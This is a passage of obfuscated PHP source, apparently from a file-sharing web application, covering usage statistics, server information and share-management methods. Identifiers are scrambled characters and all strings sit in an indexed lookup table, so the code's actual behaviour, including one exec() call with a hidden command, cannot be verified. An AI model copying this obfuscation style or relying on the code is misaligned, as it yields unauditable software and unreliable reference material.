$this->typeLogCnt($ğÉÙ¸Ó•[1856]), $ğÉÙ¸Ó•[1857] => $this->typeLogCnt($ğÉÙ¸Ó•[1857]), $ğÉÙ¸Ó•[630] => $this->typeLogCnt($ğÉÙ¸Ó•[12], $ğÉÙ¸Ó•[1832])); } private function typeLogCnt($’€êØù¹ = '', $Î¦¿Ü¶ë = "\x69\144") { $ğÕÀÃËñ =& $_SERVER[—ÌÒğš÷]; $¿¢«ºÖ¢ = array($ğÕÀÃËñ[107] => array($ğÕÀÃËñ[1858], $ğÕÀÃËñ[1859]), $ğÕÀÃËñ[493] => array($ğÕÀÃËñ[1860], $ğÕÀÃËñ[1861]), $ğÕÀÃËñ[1856] => array($ğÕÀÃËñ[1862], $ğÕÀÃËñ[1863], $ğÕÀÃËñ[1864]), $ğÕÀÃËñ[1857] => array($ğÕÀÃËñ[1865], $ğÕÀÃËñ[1866]), $ğÕÀÃËñ[1867] => array($ğÕÀÃËñ[1868], $ğÕÀÃËñ[1869], $ğÕÀÃËñ[1870])); $˜å®å‚¿ = strtotime(date($ğÕÀÃËñ[1828])); $Íáıï­ = array($ğÕÀÃËñ[215] => array($ğÕÀÃËñ[1058], $˜å®å‚¿)); if ($’€êØù¹) { $Íáıï­[$ğÕÀÃËñ[33]] = array($ğÕÀÃËñ[7], $¿¢«ºÖ¢[$’€êØù¹]); } $ï«âÄø‡ = Model($ğÕÀÃËñ[1831])->where($Íáıï­)->count($Î¦¿Ü¶ë); return (int) $ï«âÄø‡; } private function optionServer() { $è•õ¶ ù =& $_SERVER[—ÌÒğš÷]; $ôê§Œ„Ä = $this->diskDriver(); $ñùòÁè× = KodIO::defaultDriver(); $ßŸªÀşı = array($è•õ¶ ù[853] => $ñùòÁè×[$è•õ¶ ù[443]]); $ıŒØ… = Model($è•õ¶ ù[512])->where($ßŸªÀşı)->sum($è•õ¶ ù[76]); $è¾Î·ÚÌ = explode($è•õ¶ ù[53], $_SERVER[$è•õ¶ ù[144]]); $÷ÉÕ×Ô = $è¾Î·ÚÌ[0]; $ñõ¿¶² = $GLOBALS[$è•õ¶ ù[6]][$è•õ¶ ù[21]]; $•¼î¿ = $ñõ¿¶²[$è•õ¶ ù[1020]]; if ($•¼î¿ == $è•õ¶ ù[1008]) { $óóşä = explode($è•õ¶ ù[1326], $ñõ¿¶²[$è•õ¶ ù[1019]]); $•¼î¿ = $óóşä[0]; } if ($•¼î¿ == $è•õ¶ ù[956] || $•¼î¿ == $è•õ¶ ù[840]) { $Åå«Û…Ä = Model()->db()->query($è•õ¶ ù[1871]); $»ø÷Øş = $Åå«Û…Ä[0] && isset($Åå«Û…Ä[0][$è•õ¶ ù[1584]]) ? $Åå«Û…Ä[0][$è•õ¶ ù[1584]] : 0; $•¼î¿ = $è•õ¶ ù[1872] . ($»ø÷Øş ? $è•õ¶ ù[8] . $»ø÷Øş : $è•õ¶ ù[12]); } $ğÔêàğ = $GLOBALS[$è•õ¶ ù[6]][$è•õ¶ ù[393]][$è•õ¶ ù[863]]; return array($è•õ¶ ù[1873] => $ôê§Œ„Ä ? $ôê§Œ„Ä[$è•õ¶ ù[1874]] : 0, $è•õ¶ ù[1875] => $ôê§Œ„Ä ? $ôê§Œ„Ä[$è•õ¶ ù[1876]] : 0, $è•õ¶ ù[1877] => (int) $ñùòÁè×[$è•õ¶ ù[1874]] * 1024 * 1024 * 1024, $è•õ¶ ù[1878] => (int) $ıŒØ…, $è•õ¶ ù[1879] => ucfirst($÷ÉÕ×Ô), $è•õ¶ ù[1880] => $è•õ¶ ù[1881] . PHP_VERSION, $è•õ¶ ù[1882] => phpBuild64() ? 64 : 32, $è•õ¶ ù[793] => str_replace($è•õ¶ ù[1174], $è•õ¶ ù[1036], $•¼î¿), $è•õ¶ ù[393] => ucfirst($ğÔêàğ), $è•õ¶ ù[32] => $_SERVER[$è•õ¶ ù[1883]]); } private function diskDriver() { $ì›Æ®É =& $_SERVER[—ÌÒğš÷]; $Ñ¿âò¿ = $ì›Æ®É[8]; $ÒĞŒçä = $GLOBALS[$ì›Æ®É[6]][$ì›Æ®É[1343]] == $ì›Æ®É[1344]; if ($ÒĞŒçä) { $Ñ¿âò¿ = $ì›Æ®É[1884]; if (function_exists($ì›Æ®É[1885])) { exec($ì›Æ®É[1886], $ÒıÖóÍ); $Ñ¿âò¿ = $ÒıÖóÍ[1] . $ì›Æ®É[8]; } } if (!file_exists($Ñ¿âò¿)) { return; } $›¨÷¦âğ = @disk_total_space($Ñ¿âò¿); $ìÄä°úß = $›¨÷¦âğ - @disk_free_space($Ñ¿âò¿); return array($ì›Æ®É[1874] => $›¨÷¦âğ, $ì›Æ®É[1876] => $ìÄä°úß); } public function fileChart($ÒÑî¡¼) { $šÔ“ñ» =& $_SERVER[—ÌÒğš÷]; if (isset($ÒÑî¡¼[$šÔ“ñ»[1688]])) { return Model($šÔ“ñ»[861])->userFileTypeProfile($ÒÑî¡¼[$šÔ“ñ»[1688]]); } if (isset($ÒÑî¡¼[$šÔ“ñ»[1887]])) { return Model($šÔ“ñ»[861])->groupFileTypeProfile($ÒÑî¡¼[$šÔ“ñ»[1887]]); } $İ¡çÃ” = $this->sourceSize(); $“¢ÆÒÒ¿ = array($šÔ“ñ»[180] => 0, $šÔ“ñ»[178] => 1); $ÓÙèò™å = Model($šÔ“ñ»[861])->where($“¢ÆÒÒ¿)->sum($šÔ“ñ»[76]); $“¢ÆÒÒ¿[$šÔ“ñ»[178]] = 2; $Ä†»É£á = Model($šÔ“ñ»[861])->where($“¢ÆÒÒ¿)->sum($šÔ“ñ»[76]); return array($šÔ“ñ»[799] => $İ¡çÃ”[$šÔ“ñ»[76]], $šÔ“ñ»[1821] => $İ¡çÃ”[$šÔ“ñ»[1821]], $šÔ“ñ»[1822] => (int) $ÓÙèò™å, $šÔ“ñ»[1823] => (int) $Ä†»É£á); } private function sourceSize() { $ğ˜†š®ã =& $_SERVER[—ÌÒğš÷]; $§ë«‹¸Ô = Model($ğ˜†š®ã[861])->where(array($ğ˜†š®ã[453] => 0))->sum($ğ˜†š®ã[76]); $¹ìôŠˆÛ = Model($ğ˜†š®ã[512])->sum($ğ˜†š®ã[76]); if ($¹ìôŠˆÛ > $§ë«‹¸Ô) { $¹ìôŠˆÛ = $§ë«‹¸Ô; } return array($ğ˜†š®ã[76] => (int) $§ë«‹¸Ô, $ğ˜†š®ã[1821] => (int) $¹ìôŠˆÛ); } } goto fÇˆ˜¤‰; C”›·‚Œ¥ë: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\124\151\x6d\145", "\164\151\155\145", "\x69\156\163\x65\162\x74\54\x75\160\x64\141\x74\x65", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\143\x72\x65\141\164\x65\124\x69\155\145", "\164\x69\155\145", "\151\156\x73\x65\162\x74", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\x6f\x70\164\x69\x6f\156\x73", '', "\151\156\163\145\162\x74\x2c\165\x70\144\141\x74\145\54\163\x65\154\145\143\164", "\x6a\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($¦‰£—ä’) { $ÆùÀãş³ =& $_SERVER[—ÌÒğš÷]; $Ğø‰Ÿä = isset($¦‰£—ä’[0]) ? $¦‰£—ä’[0] : !1; return array($ÆùÀãş³[2026] => array(USER_ID, $ÆùÀãş³[2027]), $ÆùÀãş³[1967] => array($Ğø‰Ÿä, $ÆùÀãş³[2028])); } protected function listSimple() { $…âŠ«°³ = array($_SERVER[—ÌÒğš÷][1688] => USER_ID); $ı½ëµ¸ = $this->field($this->fieldList)->where($…âŠ«°³)->select(); return $ı½ëµ¸ ? $ı½ëµ¸ : array(); } protected function getInfo($±Ù«Àî, $úÂŸã²« = false) { $Ê¡Ó¦¶• =& $_SERVER[—ÌÒğš÷]; if ($úÂŸã²«) { return $this->_getShareInfo(array($Ê¡Ó¦¶•[633] => $±Ù«Àî)); } $­Øû¯¢Á = $this->cacheFunctionGet($Ê¡Ó¦¶•[1969], $±Ù«Àî); return $­Øû¯¢Á; } public function getInfoByHash($ëÚ®ŒÉ) { return $this->_getShareInfo(array($_SERVER[—ÌÒğš÷][2029] => $ëÚ®ŒÉ)); } public function getInfoByPath($è¦ç€Ì) { $ ş£â»„ =& $_SERVER[—ÌÒğš÷]; $—¯Ø»° = array($ ş£â»„[1688] => USER_ID, $ ş£â»„[181] => $è¦ç€Ì); return $this->_getShareInfo($—¯Ø»°); } public function getInfoBySourcePath($ı„ÖïÈã) { $›’şñÌ =& $_SERVER[—ÌÒğš÷]; $ Ñ´ŸŒå = array($›’şñÌ[1688] => USER_ID, $›’şñÌ[1219] => $ı„ÖïÈã); return $this->_getShareInfo($ Ñ´ŸŒå); } private function _getShareInfo($ïÉî–ô¸) { $ˆÚí´ =& $_SERVER[—ÌÒğš÷]; $¯ö•–Ûè = $this->where($ïÉî–ô¸)->find(); if (!$¯ö•–Ûè) { return !1; } $ïÉî–ô¸ = array($ˆÚí´[633] => $¯ö•–Ûè[$ˆÚí´[633]]); $Ëµ¶°ƒ– = $ˆÚí´[2030]; $ÏÔû˜É = Model($ˆÚí´[634])->order($ˆÚí´[443])->field($Ëµ¶°ƒ–)->where($ïÉî–ô¸)->select(); if ($¯ö•–Ûè[$ˆÚí´[181]] == $ˆÚí´[212]) { $¯ö•–Ûè[$ˆÚí´[87]] = IO::info($¯ö•–Ûè[$ˆÚí´[1219]]); } else { $¯ö•–Ûè[$ˆÚí´[87]] = Model($ˆÚí´[1376])->pathInfo($¯ö•–Ûè[$ˆÚí´[181]]); } $¯ö•–Ûè[$ˆÚí´[2031]] = $ÏÔû˜É; return $¯ö•–Ûè; } protected function getInfoAuth($›ÇíûíŠ) { $ÁÍ·‚ =& $_SERVER[—ÌÒğš÷]; $Ê»ğôéå = $this->getInfo($›ÇíûíŠ); if ($Ê»ğôéå[$ÁÍ·‚[1688]] == USER_ID) { $Ê»ğôéå[$ÁÍ·‚[455]] = $Ê»ğôéå[$ÁÍ·‚[87]][$ÁÍ·‚[455]]; } else { $Ê»ğôéå[$ÁÍ·‚[455]] = Model($ÁÍ·‚[535])->authMake($Ê»ğôéå[$ÁÍ·‚[2031]]); } return $Ê»ğôéå; } protected function listData($ÄàÀƒ¯Š = null, $å»¯ìôŸ = 300) { $İúÁ¥Š =& $_SERVER[—ÌÒğš÷]; $€Ê×¢¬é = array(array($İúÁ¥Š[530] => array($İúÁ¥Š[1056], 0), $İúÁ¥Š[631] => array($İúÁ¥Š[1056], 0), $İúÁ¥Š[2032] => $İúÁ¥Š[1985])); if ($ÄàÀƒ¯Š == $İúÁ¥Š[2033]) { $€Ê×¢¬é = array($İúÁ¥Š[530] => 1); } else { if ($ÄàÀƒ¯Š == $İúÁ¥Š[1205]) { $€Ê×¢¬é = array($İúÁ¥Š[631] => 1); } } $€Ê×¢¬é[$İúÁ¥Š[1688]] = USER_ID; $¶µ½ˆ¾ƒ = $this->where($€Ê×¢¬é)->selectPage($å»¯ìôŸ); return $¶µ½ˆ¾ƒ; } protected function listToMe($ºöëÉ¨ª = 300) { $Ì·ñŸ£ =& $_SERVER[—ÌÒğš÷]; $‡àÏ¨†º = Model($Ì·ñŸ£[2034])->userGroupParents(USER_ID); $åóÓÑæ¶ = array($Ì·ñŸ£[616] => SourceModel::TYPE_USER, $Ì·ñŸ£[538] => USER_ID); if ($‡àÏ¨†º) { $åóÓÑæ¶ = array(array($Ì·ñŸ£[616] => SourceModel::TYPE_USER, $Ì·ñŸ£[538] => USER_ID), array($Ì·ñŸ£[616] => SourceModel::TYPE_GROUP, $Ì·ñŸ£[538] => array($Ì·ñŸ£[7], $‡àÏ¨†º)), $Ì·ñŸ£[2032] => $Ì·ñŸ£[1985]); } $ñ¨ÑÈ–æ = Model($Ì·ñŸ£[634])->where($åóÓÑæ¶)->selectPage($ºöëÉ¨ª); $¤Ú“ û² = array_to_keyvalue_group($ñ¨ÑÈ–æ[$Ì·ñŸ£[413]], $Ì·ñŸ£[633]); if (!$¤Ú“ û²) { return $ñ¨ÑÈ–æ; } $ğÌÂş¬è = $Ì·ñŸ£[2035]; $åóÓÑæ¶ = array($Ì·ñŸ£[633] => array($Ì·ñŸ£[460], array_keys($¤Ú“ û²)), $Ì·ñŸ£[1688] => array($Ì·ñŸ£[1058], $Ì·ñŸ£[212])); $Š‡éöÅ = $this->field($ğÌÂş¬è)->where($åóÓÑæ¶)->select(); foreach ($Š‡éöÅ as $Óğ‘ü => &$Ìò´Ä¿¿) { $Ìò´Ä¿¿[$Ì·ñŸ£[2031]] = $¤Ú“ û²[$Ìò´Ä¿¿[$Ì·ñŸ£[633]]]; } unset($Ìò´Ä¿¿); $àÅ•Ò¹„ = array($Ì·ñŸ£[2036] => $Š‡éöÅ, $Ì·ñŸ£[2037] => $ñ¨ÑÈ–æ[$Ì·ñŸ£[410]]); return $àÅ•Ò¹„; } protected function shareAdd($˜àÑü, $«Éö½‹É) { $áÉÜÜÌ¿ =& $_SERVER[—ÌÒğš÷]; $Ô¥æ‡¼³ = $this->_addShareData($˜àÑü, $«Éö½‹É); if (!empty($«Éö½‹É[$áÉÜÜÌ¿[2038]])) { $this->_shareAuthSet($Ô¥æ‡¼³, $«Éö½‹É[$áÉÜÜÌ¿[2038]]); } $this->shareEventAdd($˜àÑü, $«Éö½‹É, $áÉÜÜÌ¿[2039]); return $Ô¥æ‡¼³; } protected function shareAddSystem($ À×ï‚Â, $»Ñ›Ì¡) { $ÈŒ·Ö™ =& $_SERVER[—ÌÒğš÷]; $ŞÀáŒÓ£ = $this->_addShareData($ À×ï‚Â, $»Ñ›Ì¡, $ÈŒ·Ö™[179]); $this->_shareAuthSet($ŞÀáŒÓ£, $»Ñ›Ì¡[$ÈŒ·Ö™[2038]]); return $ŞÀáŒÓ£; } private function shareEventAdd($©¶ôÙÙö, $ÓŒÎ‡´Ï, $Ø€Ãâª = "\141\144\144") { $Ş¥÷‡Š© =& $_SERVER[—ÌÒğš÷]; if (!$©¶ôÙÙö || $©¶ôÙÙö == $Ş¥÷‡Š©[212]) { return; } if ($Ø€Ãâª == $Ş¥÷‡Š©[2039]) { if ($ÓŒÎ‡´Ï[$Ş¥÷‡Š©[530]] == $Ş¥÷‡Š©[88]) { Model($Ş¥÷‡Š©[601])->eventShare($©¶ôÙÙö, $Ş¥÷‡Š©[2040]); } if ($ÓŒÎ‡´Ï[$Ş¥÷‡Š©[631]] == $Ş¥÷‡Š©[88]) { Model($Ş¥÷‡Š©[601])->eventShare($©¶ôÙÙö, $Ş¥÷‡Š©[2041]); } return; } $‘¨ö½Ô = $this->getInfoByPath($©¶ôÙÙö); $†«ØÑã = $Ş¥÷‡Š©[2042]; if ($‘¨ö½Ô[$Ş¥÷‡Š©[530]] == $Ş¥÷‡Š©[212] && $ÓŒÎ‡´Ï[$Ş¥÷‡Š©[530]] == $Ş¥÷‡Š©[88]) { $†«ØÑã = $Ş¥÷‡Š©[2040]; } if ($‘¨ö½Ô[$Ş¥÷‡Š©[530]] == $Ş¥÷‡Š©[88] && $ÓŒÎ‡´Ï[$Ş¥÷‡Š©[530]] == $Ş¥÷‡Š©[212]) { $†«ØÑã = $Ş¥÷‡Š©[2043]; } if ($‘¨ö½Ô[$Ş¥÷‡Š©[631]] == $Ş¥÷‡Š©[212] && $ÓŒÎ‡´Ï[$Ş¥÷‡Š©[631]] == $Ş¥÷‡Š©[88]) { $†«ØÑã = $Ş¥÷‡Š©[2041]; } if ($‘¨ö½Ô[$Ş¥÷‡Š©[631]] == $Ş¥÷‡Š©[88] && $ÓŒÎ‡´Ï[$Ş¥÷‡Š©[631]] == $Ş¥÷‡Š©[212]) { $†«ØÑã = $Ş¥÷‡Š©[2044]; } Model($Ş¥÷‡Š©[601])->eventShare($©¶ôÙÙö, $†«ØÑã); return; } private function _addShareData($ÍÄ™…÷Ë, $çìÌèÁ© = array(), $áü‡ñ·º = false) { $ëÅÛ± =& $_SERVER[—ÌÒğš÷]; $‹ôëÒ¶„ = $áü‡ñ·º == $ëÅÛ±[179] ? 0 : USER_ID; $¸…ŒøË‚ = array($ëÅÛ±[459] => $ÍÄ™…÷Ë, $ëÅÛ±[1679] => $‹ôëÒ¶„); if ($ÍÄ™…÷Ë == 0) { $¸…ŒøË‚ = array($ëÅÛ±[2045] => $çìÌèÁ©[$ëÅÛ±[1219]], $ëÅÛ±[1679] => $‹ôëÒ¶„); } if ($£“óÂò = $this->where($¸…ŒøË‚)->find()) { return $£“óÂò[$ëÅÛ±[633]]; } if ($ÍÄ™…÷Ë == 0) { $œà•î¡› = array($ëÅÛ±[32] => get_path_this($çìÌèÁ©[$ëÅÛ±[84]])); } else { $œà•î¡› = Model($ëÅÛ±[861])->sourceInfo($ÍÄ™…÷Ë); if (!$œà•î¡›) { return !1; } } if (!$çìÌèÁ©[$ëÅÛ±[1585]]) { $çìÌèÁ©[$ëÅÛ±[1585]] = $œà•î¡›[$ëÅÛ±[32]]; } $ÀıÅÖûö = array($ëÅÛ±[1679] => $‹ôëÒ¶„, $ëÅÛ±[459] => $ÍÄ™…÷Ë, $ëÅÛ±[1585] => $ëÅÛ±[12], $ëÅÛ±[530] => 0, $ëÅÛ±[631] => 0, $ëÅÛ±[1219] => $ëÅÛ±[12], $ëÅÛ±[351] => $ëÅÛ±[12], $ëÅÛ±[933] => $ëÅÛ±[12], $ëÅÛ±[2046] => 0, $ëÅÛ±[2047] => 0, $ëÅÛ±[797] => 0, $ëÅÛ±[2048] => $ëÅÛ±[12], $ëÅÛ±[2029] => $ëÅÛ±[12]); $è¨†ª‹Ñ = explode($ëÅÛ±[50], $ëÅÛ±[2049]); foreach ($è¨†ª‹Ñ as $üıËœ) { if (!isset($çìÌèÁ©[$üıËœ])) { continue; } $ÀıÅÖûö[$üıËœ] = $çìÌèÁ©[$üıËœ]; } $ÁÂá„û = $this->add($ÀıÅÖûö); $§ÀìŒúÀ = array($ëÅÛ±[2029] => short_id($ÁÂá„û)); $this->where(array($ëÅÛ±[2050] => $ÁÂá„û))->save($§ÀìŒúÀ); return $ÁÂá„û; } private function _shareAuthSet($ù”Í€“ç, $©Ë¦ªşø) { $ÁÈŸ‘„¸ =& $_SERVER[—ÌÒğš÷]; if (!is_array($©Ë¦ªşø)) { return !1; } $àï˜Ÿşõ = Model($ÁÈŸ‘„¸[1995]); $àï˜Ÿşõ->where(array($ÁÈŸ‘„¸[633] => $ù”Í€“ç))->delete(); $ÕŒË”Ç¢ = array(); foreach ($©Ë¦ªşø as $×ïñ†Ô­) { $¬™²Û“ = SourceModel::TYPE_USER; if ($×ïñ†Ô­[$ÁÈŸ‘„¸[178]] == SourceModel::TYPE_GROUP) { $¬™²Û“ = SourceModel::TYPE_GROUP; } $Èä­—£½ = array($ÁÈŸ‘„¸[633] => $ù”Í€“ç, $ÁÈŸ‘„¸[178] => $¬™²Û“, $ÁÈŸ‘„¸[538] => intval($×ïñ†Ô­[$ÁÈŸ‘„¸[538]]), $ÁÈŸ‘„¸[1991] => 0, $ÁÈŸ‘„¸[2051] => -1); if ($×ïñ†Ô­[$ÁÈŸ‘„¸[1991]]) { $Èä­—£½[$ÁÈŸ‘„¸[1991]] = $×ïñ†Ô­[$ÁÈŸ‘„¸[1991]]; } else { if ($×ïñ†Ô­[$ÁÈŸ‘„¸[2051]]) { $Èä­—£½[$ÁÈŸ‘„¸[2051]] = $×ïñ†Ô­[$ÁÈŸ‘„¸[2051]]; } } $ÕŒË”Ç¢[] = $Èä­—£½; } return $àï˜Ÿşõ->addAll($ÕŒË”Ç¢, array(), !0); } public function numViewAdd($Í²àÂÑê) { $˜»Ö¿Ÿß =& $_SERVER[—ÌÒğš÷]; $Ïé­ = array($˜»Ö¿Ÿß[2050] => $Í²àÂÑê); $this->where($Ïé­)->setAdd($˜»Ö¿Ÿß[2046]); } public function numDownloadAdd($ıù¦ôÇÃ) { $œ©µÛÓ =& $_SERVER[—ÌÒğš÷]; $Ë©†™ºÖ = array($œ©µÛÓ[2050] => $ıù¦ôÇÃ); $this->where($Ë©†™ºÖ)->setAdd($œ©µÛÓ[2047]); } protected function shareEdit($â»ïå›, $·ı´™ª) { $Œá ÀÒò =& $_SERVER[—ÌÒğš÷]; $›õ½îâ¨ = $this->getInfo($â»ïå›); if (!$›õ½îâ¨) { return !1; } $this->_checkLinkShare($·ı´™ª, $›õ½îâ¨); $¸´è¸¾Ü = array(); $ì•ŞÍÒÙ = explode($Œá ÀÒò[50], $Œá ÀÒò[2052]); foreach ($ì•ŞÍÒÙ as $©Âé–) { if (!array_key_exists($©Âé–, $·ı´™ª)) { continue; } $¸´è¸¾Ü[$©Âé–] = $·ı´™ª[$©Âé–]; } $this->shareEventAdd($›õ½îâ¨[$Œá ÀÒò[181]], $·ı´™ª, $Œá ÀÒò[1857]); $this->where(array($Œá ÀÒò[2050] => $â»ïå›))->save($¸´è¸¾Ü); if (isset($·ı´™ª[$Œá ÀÒò[2038]])) { $this->_shareAuthSet($â»ïå›, $·ı´™ª[$Œá ÀÒò[2038]]); } return !0; } private function _checkLinkShare($ÏÃÜÛ“Ç, $Ø¸ô–®Ì) { $êÓğ¨‡İ =& $_SERVER[—ÌÒğš÷]; if ($ÏÃÜÛ“Ç[$êÓğ¨‡İ[530]] != $êÓğ¨‡İ[88]) { return; } $¥Ş£…‹Ë = $Ø¸ô–®Ì[$êÓğ¨‡İ[87]][$êÓğ¨‡İ[181]]; if ($Ø¸ô–®Ì[$êÓğ¨‡İ[87]][$êÓğ¨‡İ[33]] != $êÓğ¨‡İ[214]) { $â„ï³î« = $this->_folderReport($¥Ş£…‹Ë); if (!$â„ï³î«) { return; } show_json(LNG($êÓğ¨‡İ[2053]) . $êÓğ¨‡İ[2054] . $â„ï³î«, !1); } $¯Êì‡› = Model($êÓğ¨‡İ[861])->fileInfoGet($Ø¸ô–®Ì[$êÓğ¨‡İ[87]][$êÓğ¨‡İ[181]]); if (!$¯Êì‡›) { return; } $¤ø–İĞ = $this->shareFileMeta($¯Êì‡›[$êÓğ¨‡İ[509]]); if (isset($¤ø–İĞ[$êÓğ¨‡İ[418]]) && $¤ø–İĞ[$êÓğ¨‡İ[418]] == $êÓğ¨‡İ[88]) { show_json(LNG($êÓğ¨‡İ[2055]), !1); } } private function _folderReport($’ò“¹˜) { $ô°”ÊÅ =& $_SERVER[—ÌÒğš÷]; $éËå¬ë = array($ô°”ÊÅ[509] => array($ô°”ÊÅ[1056], 0), $ô°”ÊÅ[786] => 3); $±ĞêËá = Model($ô°”ÊÅ[2056])->where($éËå¬ë)->field($ô°”ÊÅ[509])->select(); if (!$±ĞêËá) { return !1; } $±ĞêËá = array_to_keyvalue($±ĞêËá, $ô°”ÊÅ[12], $ô°”ÊÅ[509]); $ìä”½ûÓ = $ô°”ÊÅ[50] . $’ò“¹˜ . $ô°”ÊÅ[50]; $éËå¬ë = array($ô°”ÊÅ[509] => array($ô°”ÊÅ[7], $±ĞêËá), $ô°”ÊÅ[553] => array($ô°”ÊÅ[427], "\x25{$ìä”½ûÓ}\x25"), $ô°”ÊÅ[473] => 0); $¢ë‹Óû = Model($ô°”ÊÅ[861])->where($éËå¬ë)->field($ô°”ÊÅ[2057])->find(); if (!$¢ë‹Óû) { return !1; } $ë™×Š˜ = substr($¢ë‹Óû[$ô°”ÊÅ[553]], strpos($¢ë‹Óû[$ô°”ÊÅ[553]], $ìä”½ûÓ)); $éËå¬ë = array($ô°”ÊÅ[181] => array($ô°”ÊÅ[7], trim($ë™×Š˜, $ô°”ÊÅ[50]))); $û†Ášû± = Model($ô°”ÊÅ[861])->where($éËå¬ë)->field($ô°”ÊÅ[32])->select(); $œËŞªÌó = array_to_keyvalue($û†Ášû±, $ô°”ÊÅ[12], $ô°”ÊÅ[32]); $œËŞªÌó[] = $¢ë‹Óû[$ô°”ÊÅ[32]]; return implode($ô°”ÊÅ[8], $œËŞªÌó); } protected function remove($²¼üÜÎ¦) { $—½ĞÛŞÊ =& $_SERVER[—ÌÒğš÷]; if (is_array($²¼üÜÎ¦)) { $²¼üÜÎ¦ = array($—½ĞÛŞÊ[7], $²¼üÜÎ¦); } $Ú¸ÍÅ¸› = array($—½ĞÛŞÊ[633] => $²¼üÜÎ¦); $ûƒãÀÕğ = $this->where($Ú¸ÍÅ¸›)->delete(); if ($ûƒãÀÕğ) { Model($—½ĞÛŞÊ[634])->where(array($—½ĞÛŞÊ[633] => $²¼üÜÎ¦))->delete(); } $ˆê©ì¶ = is_array($²¼üÜÎ¦) ? $²¼üÜÎ¦[1] : array($²¼üÜÎ¦); for ($àÇšŒ÷ş = 0; $àÇšŒ÷ş < count($ˆê©ì¶); $àÇšŒ÷ş++) { $é’›¦Ë = $this->getInfo($ˆê©ì¶[$àÇšŒ÷ş]); if ($é’›¦Ë[$—½ĞÛŞÊ[631]] == $—½ĞÛŞÊ[88]) { Model($—½ĞÛŞÊ[601])->eventShare($é’›¦Ë[$—½ĞÛŞÊ[181]], $—½ĞÛŞÊ[2044]); } if ($é’›¦Ë[$—½ĞÛŞÊ[530]] == $—½ĞÛŞÊ[88]) { Model($—½ĞÛŞÊ[601])->eventShare($é’›¦Ë[$—½ĞÛŞÊ[181]], $—½ĞÛŞÊ[2043]); } } return $ûƒãÀÕğ; } protected function removeBySource($øıËàÆ–) { $ˆ›ª—ŠÉ =& $_SERVER[—ÌÒğš÷]; $‰³ÆßĞÚ = array($ˆ›ª—ŠÉ[459] => array($ˆ›ª—ŠÉ[460], $øıËàÆ–)); $ÜÄóƒ˜Œ = $this->field($ˆ›ª—ŠÉ[633])->where($‰³ÆßĞÚ)->select(); $ÜÄóƒ˜Œ = array_to_keyvalue($ÜÄóƒ˜Œ, $ˆ›ª—ŠÉ[12], $ˆ›ª—ŠÉ[633]); if (!$ÜÄóƒ˜Œ) { return; } $‰³ÆßĞÚ = array($ˆ›ª—ŠÉ[2050] => array($ˆ›ª—ŠÉ[460], $ÜÄóƒ˜Œ)); $this->where($‰³ÆßĞÚ)->delete(); Model($ˆ›ª—ŠÉ[634])->where($‰³ÆßĞÚ)->delete(); } public function listAll($™ê—ÊŠõ) { $Îõ™® =& $_SERVER[—ÌÒğš÷]; $ë€Àšä = array(); if ($™ê—ÊŠõ[$Îõ™®[1688]]) { $ë€Àšä[$Îõ™®[1688]] = $™ê—ÊŠõ[$Îõ™®[1688]]; } if ($™ê—ÊŠõ[$Îõ™®[796]]) { $‰µƒ¥ì = $™ê—ÊŠõ[$Îõ™®[797]] ? $™ê—ÊŠõ[$Îõ™®[797]] : strtotime(date($Îõ™®[2058])); $ë€Àšä[$Îõ™®[215]] = array($Îõ™®[377], array($™ê—ÊŠõ[$Îõ™®[796]], $‰µƒ¥ì)); } if ($™ê—ÊŠõ[$Îõ™®[33]]) { $ë€Àšä[$™ê—ÊŠõ[$Îõ™®[33]]] = 1; } else { $ë€Àšä[] = array($Îõ™®[530] => array($Îõ™®[1056], 0), $Îõ™®[631] => array($Îõ™®[1056], 0), $Îõ™®[2032] => $Îõ™®[1985]); } if ($™ê—ÊŠõ[$Îõ™®[1981]]) { $ë€Àšä[] = array($Îõ™®[2029] => $™ê—ÊŠõ[$Îõ™®[1981]], $Îõ™®[1585] => array($Îõ™®[427], "\45{$™ê—ÊŠõ[$Îõ™®[1981]]}\x25"), $Îõ™®[2032] => $Îõ™®[1985]); } $ÍÀÃı€š = $this->_makeOrder()->where($ë€Àšä)->selectPage(20); if (empty($ÍÀÃı€š[$Îõ™®[413]])) { return array(); } $this->_listDataApply($ÍÀÃı€š[$Îõ™®[413]]); return $ÍÀÃı€š; } public function listDataApply($ßÄ´äĞ’) { $this->_listDataApply($ßÄ´äĞ’); return $ßÄ´äĞ’; } private function _listDataApply(&$ÉÄ±ëèÇ) { $Á´çšõÀ =& $_SERVER[—ÌÒğš÷]; $öÄõÒ¬³ = array_to_keyvalue($ÉÄ±ëèÇ, $Á´çšõÀ[12], $Á´çšõÀ[1688]); $ê·™¾‡ã = Model($Á´çšõÀ[567])->userListInfo(array_unique($öÄõÒ¬³)); $†§›Ìñß = array_to_keyvalue($ÉÄ±ëèÇ, $Á´çšõÀ[12], $Á´çšõÀ[181]); $•Æ¬ÜÑÆ = Model($Á´çšõÀ[861])->sourceListInfo($†§›Ìñß, !0); foreach ($ÉÄ±ëèÇ as $œÑßÕ° => &$ä©Ò¼Œº) { $„ ™ù = $ä©Ò¼Œº[$Á´çšõÀ[1688]]; $ä©Ò¼Œº[$Á´çšõÀ[2059]] = $ê·™¾‡ã[$„ ™ù] ? $ê·™¾‡ã[$„ ™ù] : !1; $„Ìí‘ƒ¶ = $ä©Ò¼Œº[$Á´çšõÀ[181]]; $ä©Ò¼Œº[$Á´çšõÀ[87]] = $•Æ¬ÜÑÆ[$„Ìí‘ƒ¶] ? $•Æ¬ÜÑÆ[$„Ìí‘ƒ¶] : !1; if ($ä©Ò¼Œº[$Á´çšõÀ[87]][$Á´çšõÀ[473]] == $Á´çšõÀ[88]) { unset($ÉÄ±ëèÇ[$œÑßÕ°]); } if ($ä©Ò¼Œº[$Á´çšõÀ[87]] != $Á´çšõÀ[212] && !$ä©Ò¼Œº[$Á´çšõÀ[87]]) { unset($ÉÄ±ëèÇ[$œÑßÕ°]); } } unset($ä©Ò¼Œº); $ÉÄ±ëèÇ = array_values($ÉÄ±ëèÇ); } private function _makeOrder($ÛëçÁ = '') { $¤£ß¡Á =& $_SERVER[—ÌÒğš÷]; $è—ú£»Û = array($¤£ß¡Á[215], $¤£ß¡Á[797], $¤£ß¡Á[2046], $¤£ß¡Á[2047]); $¹ï™ç˜ = array($¤£ß¡Á[491] => $¤£ß¡Á[492], $¤£ß¡Á[493] => 